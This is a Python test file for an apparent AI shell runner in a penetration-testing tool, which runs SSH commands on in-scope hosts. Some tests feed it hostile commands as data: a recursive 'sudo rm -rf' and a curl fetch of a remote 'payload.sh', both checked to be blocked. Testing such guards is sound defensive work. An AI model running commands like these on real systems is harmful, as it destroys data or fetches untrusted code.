from __future__ import annotations

import json

from workers.orchestration.tasks import SUPPORTED_TOOLS, dispatch_runner
from workers.runners.ai_shell.runner import (
    AI_SHELL_RESULTS_ARTIFACT_NAME,
    CommandResult,
    execute_ai_shell_command,
)
from workers.runners.base.contracts import RunnerRequest


def _artifact_payload(execution):
    artifact = next(
        item for item in execution.artifacts if item.name == AI_SHELL_RESULTS_ARTIFACT_NAME
    )
    return json.loads(artifact.data.decode("utf-8"))


def test_ai_shell_runner_executes_single_ssh_command_with_output_cap() -> None:
    calls: list[tuple[list[str], float]] = []

    def fake_runner(command: list[str], timeout_seconds: float) -> CommandResult:
        calls.append((command, timeout_seconds))
        return CommandResult(returncode=0, stdout="abcdef", stderr="")

    execution = execute_ai_shell_command(
        targets=["10.0.20.44"],
        scope_allowlist={"cidr_ranges": ["10.0.20.0/24"]},
        command="id",
        credentials_ref="vault://engagement/linux-admin",
        username="operator",
        output_cap_chars=5,
        timeout_seconds=12,
        command_runner=fake_runner,
        ssh_binary="ssh",
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 0
    assert execution.stdout == "abcde"
    assert execution.metadata["stdout_truncated"] is True
    assert calls == [
        (
            [
                "ssh",
                "-o",
                "BatchMode=yes",
                "-o",
                "StrictHostKeyChecking=accept-new",
                "-p",
                "22",
                "operator@10.0.20.44",
                "id",
            ],
            12,
        )
    ]
    assert payload["command"] == "id"
    assert payload["credentials_ref"] == "vault://engagement/linux-admin"
    assert payload["stdout_truncated"] is True
    assert payload["safety"]["per_command_approval_required"] is True


def test_ai_shell_runner_blocks_banned_command_before_execution() -> None:
    def failing_runner(_command: list[str], _timeout_seconds: float) -> CommandResult:
        raise AssertionError("banned ai-shell command must not execute")

    execution = execute_ai_shell_command(
        targets=["10.0.20.44"],
        scope_allowlist={"cidr_ranges": ["10.0.20.0/24"]},
        command="sudo rm -rf /tmp/aegispt-proof",
        credentials_ref="vault://engagement/linux-admin",
        command_runner=failing_runner,
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 1
    assert execution.metadata["status"] == "blocked"
    assert execution.metadata["reason"] == "banned_rm_rf"
    assert payload["status"] == "blocked"
    assert payload["safety"]["blocked_before_execution"] is True


def test_ai_shell_runner_blocks_out_of_scope_download_url() -> None:
    execution = execute_ai_shell_command(
        targets=["10.0.20.44"],
        scope_allowlist={"cidr_ranges": ["10.0.20.0/24"]},
        command="curl https://downloads.example.org/payload.sh",
        credentials_ref="vault://engagement/linux-admin",
    )

    assert execution.exit_code == 1
    assert execution.metadata["reason"] == "out_of_scope_download_url"


def test_ai_shell_runner_blocks_localhost_target() -> None:
    execution = execute_ai_shell_command(
        targets=["127.0.0.1"],
        scope_allowlist={"hosts": ["127.0.0.1"]},
        command="id",
        credentials_ref="vault://engagement/linux-admin",
    )

    assert execution.exit_code == 1
    assert execution.metadata["reason"] == "local_target_blocked"


def test_ai_shell_is_registered_for_worker_dispatch(monkeypatch) -> None:
    captured: dict[str, object] = {}

    def fake_execute_ai_shell_command(**kwargs):
        captured.update(kwargs)
        return execute_ai_shell_command(
            command_runner=lambda _command, _timeout: CommandResult(
                returncode=0,
                stdout="ok",
                stderr="",
            ),
            **kwargs,
        )

    monkeypatch.setattr(
        "workers.orchestration.tasks.execute_ai_shell_command",
        fake_execute_ai_shell_command,
    )

    assert "ai-shell" in SUPPORTED_TOOLS
    execution = dispatch_runner(
        RunnerRequest(
            tool="ai-shell",
            targets=["10.0.20.44"],
            scope_allowlist={"cidr_ranges": ["10.0.20.0/24"]},
            params={
                "command": "whoami",
                "via": "ssh",
                "credentials_ref": "vault://engagement/linux-admin",
                "username": "operator",
                "timeout_seconds": 3,
            },
        )
    )

    assert execution.tool == "ai-shell"
    assert captured["command"] == "whoami"
    assert captured["credentials_ref"] == "vault://engagement/linux-admin"
